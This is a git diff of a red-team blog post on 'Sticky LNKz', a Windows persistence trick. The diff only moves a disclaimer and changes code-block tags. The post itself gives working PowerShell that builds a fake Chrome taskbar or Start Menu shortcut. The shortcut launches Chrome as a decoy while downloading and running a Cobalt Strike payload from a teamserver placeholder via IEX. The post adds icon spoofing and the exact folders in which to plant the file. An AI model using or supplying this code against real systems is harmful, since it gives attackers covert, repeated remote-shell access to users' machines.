@@ -9,6 +9,9 @@ comments: false
 # Intro
 As a user in a corporate environment, what is one of the first things you do? After you get some coffee and have a chat with your co-workers about the latest news or some semi-personal event from the night before.. you log in. A good blue team will be looking to make sure when you log in there isn't some type of malware set up with persistence to run before you even hear that catchy windows logon tune. With programs like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" title="autoruns">autoruns</a> and well crafted detection methods from just about every security vendor, it is very likely a redteamer will get caught trying to drop persistence in the known and obvious locations.
 
+## Disclaimer
+As I introduce this concept, I apologize if anyone has already explored this method and might think I am blatantly plagurizing their work, I swear it is not my style. 
+
 ## User-Drive Persistence
 I've seen several different methods of persistence that redteamers (and blackhats) often use to repop a shell on a device that gets shutdown everyday and rebooted the next morning. Senspost's @_staaldraad has a handy tool I was introduced to at Blackhat called "Outlook Ruler". The original concept was once you had credz you could set up an outlook rule to pop a shell whenever needed by sending a triggered email that would delete itself and run a payload via an external webdev share. Genius! Subj: "bSpence love his shells"
 
@@ -16,9 +19,6 @@ One of the major limitations to this type of persistence is that you have to rel
 
 I recently had an engagement with @SpecterOps in which @bluscreenofjeff and @enigma0x3 introduced to me some tradecraft payload cradles in which they use .LNK and .HTA files as links in their phishing emails to get initial breach shells. I don't like to name drop, but I'd be kind of a jerk without mentioning someone like @SubTee who's been the cradle Jedi master for a year or two now. Anyways, after playing with the cradles and thinking about how my blue team might react something slapped me in the face as I looked at the taskbar.
 <<screenshot of your taskbar>>
-
-## Disclaimer
-As I introduce this concept, I apologize if anyone has already explored this method and might think I am blatantly plagurizing their work, I swear it is not my style. 
 
 ## Introducing Sticky LNKz
 The epiphany I had was that users often customize their user experience by creating Start Menu and Taskbar shortcuts to execute their favorited applications. The other thing users do is create desktop shortcuts, but I will talk about why the Start Menu and Taskbar are much more covert friendly. These shortcuts get saved on the filesystem as .LNK files since that is essentially what a shortcut is, a link to an executable.
@@ -39,16 +39,16 @@ $link.Save()
 {% endhighlight %}
 ## Snippet Step-by-Step
 The LNKName identifies the save location of the lnk you're generating. You want this to be named exactly like the a taskbar or start menu lnk might look. The BinaryPath establishes powershell.exe as the executable to run instead of the path to chrome.exe
-{% highlight css %}
+{% highlight html %}
 $LNKName = "C:\<DESIRED_LOCATION>\Google Chrome.lnk"
 $BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 {% endhighlight %}
 The first part of the command execution here is to start chrome.exe so the user gets an actual chrome popup and doesn't get suspicious that their shortcut didn't start as intended. This can be tricky and works depending on $PATH, but I've noticed putting the full path to the binary usually craps out the script. The second piece is your standard arguments to start a proxy aware shell using a CobaltStrike powershell web drive-by script that you've already hosted on your teamserver.
-{% highlight css %}
+{% highlight html %}
 $Arguments = "-nop -c `Start-Process chrome.exe; `$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('http://TEAMSERVER:80/URI'))"
 {% endhighlight %}
 The following are required to create the lnk and populate it with the information you've already defined.
-{% highlight css %}
+{% highlight html %}
 $obj = New-Object -COM WScript.Shell
 $link = $obj.CreateShortcut($LNKName)
 $link.WindowStyle = '7'
@@ -56,7 +56,7 @@ $link.TargetPath = $BinaryPath
 $link.Arguments = $Arguments
 {% endhighlight %}
 The IconLocation here is essential to our .lnk remaining covert and not tipping off the user. Notice after the full path the ", 0". This tells the lnk to take the first icon populated in the chrome.exe binary. You can explore this manually by creating shortcuts and changing the icons, but I've pretty much seen 0 as the common choice. 
-{% highlight css %}
+{% highlight html %}
 $link.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 0";
 $link.Save()
 {% endhighlight %}
@@ -64,12 +64,12 @@ $link.Save()
 You really have two options when generating the link. Locally on your lab machine and then uploading it to the below locations on the filesystem, or be bold and upload it directly to the compromised host in the start menu or taskbar locations.
 ## Task Bar
 Windows 10/7
-{% highlight css %}
+{% highlight html %}
 %AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
 {% endhighlight %}
 ## Start Menu
 Windows 10/7
-{% highlight css %}
+{% highlight html %}
 %AppData%Microsoft\Windows\Start Menu
 {% endhighlight %}
 ## Why No Desktop Love?
